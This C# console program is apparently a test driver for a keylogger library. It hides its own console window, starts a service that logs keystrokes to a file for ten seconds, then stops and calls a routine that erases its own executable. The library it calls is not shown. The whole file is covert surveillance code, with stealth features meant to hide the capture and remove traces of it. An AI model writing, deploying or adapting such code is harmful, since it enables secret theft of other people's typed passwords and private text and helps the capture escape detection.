using Custom.dotNet.EraseItself;
using KeyLogger.Library;
using KeyLogger.Library.Appenders;
using KeyLoggerLibrary.ConsoleTest.Helpers;
using System.Threading;

namespace KeyLoggerLibrary.ConsoleTest
{
    public class Program
    {

        static void Main(string[] args)
        {
            //Don´t needed, figure out changing output type to Windows Application
            ApplicationWindowHelper.HideConsoleWindow();

            IKeyLoggerService _service = new KeyLoggerService();

            _service.SetOutputMode = FileAppender.Instance;
            _service.Start();

            //Sleeping 10 seconds
            Thread.Sleep(10000);

            _service.Stop();

            _service = null;

            AutoEraseAssembly.ByCommandLine(System.Reflection.Assembly.GetExecutingAssembly().Location);
        }
    }
}
